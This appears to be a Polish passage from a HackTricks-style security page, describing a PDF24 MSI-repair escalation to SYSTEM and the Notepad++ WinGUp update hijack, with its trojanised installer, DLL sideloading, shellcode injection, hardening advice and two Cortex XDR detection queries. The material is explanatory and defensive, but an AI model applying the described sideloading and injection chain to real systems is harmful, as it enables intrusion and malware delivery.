PDF24 Creator 11.15.1 pokazuje odrębne ryzyko związane z naprawą MSI: niestandardowa akcja instalacji drukarki może podczas naprawy uruchomić widoczną konsolę z uprawnieniami SYSTEM. Dostawca zmienił instalator MSI w wersji 11.15.2, aby rozwiązać ten problem. Starsza wersja produktu stanowi jedynie wskazówkę do weryfikacji. Sprawdź zarejestrowany lub dostępny pakiet MSI, czy użytkownik może rozpocząć naprawę, czy występują podatna niestandardowa akcja i opóźnienie pliku dziennika oraz czy interaktywny pulpit może wyświetlić konsolę. Zgłoszone opóźnienie uzyskano za pomocą oplock na pliku `faxPrnInst.log`; zwykłe prawo zapisu do pliku nie jest jedynym warunkiem dostępu. Nieinteraktywna powłoka, niedostępny pakiet lub załatany instalator mogą przerwać łańcuch. Ten problem nie zależy od `AlwaysInstallElevated` i różni się od podmiany przewidywalnego skryptu tymczasowego.

---
## Zdalne przejęcie łańcucha dostaw przez słabą weryfikację aktualizatora (WinGUp / Notepad++)

Od czerwca 2025 do grudnia 2025 napastnicy, którzy przejęli infrastrukturę hostingową obsługującą proces aktualizacji Notepad++, selektywnie dostarczali wybranym ofiarom złośliwe manifesty. Starsze aktualizatory oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc spreparowana odpowiedź XML mogła przekierować klientów na kontrolowane przez napastników adresy URL. Ponieważ klient akceptował treści HTTPS bez wymagania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE pobranego instalatora, ofiary pobierały i uruchamiały spreparowany trojanem plik NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przebieg operacji (nie wymaga lokalnego exploita):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na żądania aktualizacji metadanymi napastnika, które wskazują złośliwy adres URL pobierania.
2. **Spreparowany trojanem NSIS**: instalator pobiera/uruchamia payload i wykorzystuje dwa łańcuchy wykonania:
   - **Własny podpisany plik binarny + sideload**: dołącz podpisany plik Bitdefender `BluetoothService.exe` i umieść złośliwy `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego pliku Windows przeprowadza sideload `log.dll`, który odszyfrowuje i refleksyjnie ładuje backdoor Chrysalis (zabezpieczony przez Warbird + hashowanie API utrudniające statyczne wykrywanie).
   - **Wstrzyknięcie shellcode'u za pomocą skryptu**: NSIS uruchamia skompilowany skrypt Lua, który używa Win32 API (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode'u i przygotowania Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Wnioski dotyczące hardeningu i wykrywania dla każdego automatycznego aktualizatora:
- Wymagaj **weryfikacji certyfikatu i podpisu** pobranego instalatora (przypnij podpisującego dostawcy, odrzucaj niezgodny CN/łańcuch) i podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania sterowane przez manifest, jeśli nie zostały zweryfikowane.
- Traktuj **sideloading własnego podpisanego pliku binarnego** jako punkt kontrolny wykrywania po pobraniu: generuj alert, gdy podpisany plik EXE dostawcy ładuje bibliotekę DLL o nazwie spoza kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads) oraz gdy aktualizator umieszcza lub uruchamia instalatory z katalogu tymczasowego, które nie mają podpisu dostawcy.
- Monitoruj **artefakty specyficzne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty kontrolne): mutex `Global\Jdhfv_1.0.1`, anomalne zapisy `gup.exe` do `%TEMP%` oraz etapy wstrzykiwania shellcode'u sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w wersji v8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze kompilacje wymagają weryfikacji certyfikatu i podpisu pobranego instalatora, zamiast ufać wyłącznie zabezpieczeniom transportu.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading <code>log.dll</code> przez podpisany przez Bitdefender plik EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator niepochodzący z Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Te wzorce można uogólnić na każdy updater, który akceptuje niepodpisane manifesty lub nie weryfikuje przypiętych podpisów instalatorów — przejęcie ruchu sieciowego + złośliwy instalator + sideloading z własnym podpisem umożliwiają zdalne wykonanie kodu pod przykrywką „zaufanych” aktualizacji.

---
## References
- [1] [Uwaga – Netskope Client dla Windows – lokalne podniesienie uprawnień przez rogue server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Uwaga bezpieczeństwa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – wtyczka Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – klient/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – przejęcie ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalne podniesienie uprawnień przez zapisywalne pliki w Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – podniesienie uprawnień w agencie Windows](https://checkmk.com/werk/16361)
- [10] [PoC sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – aktorzy sponsorowani przez państwa wykorzystują łańcuch dostaw Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aktualizacja informacji o incydencie przejęcia infrastruktury](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – obejście poprawki dla CVE-2025-0309 w Netskope Client dla Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – odkrywanie błędów umożliwiających podniesienie uprawnień w Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: od gRPC do SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
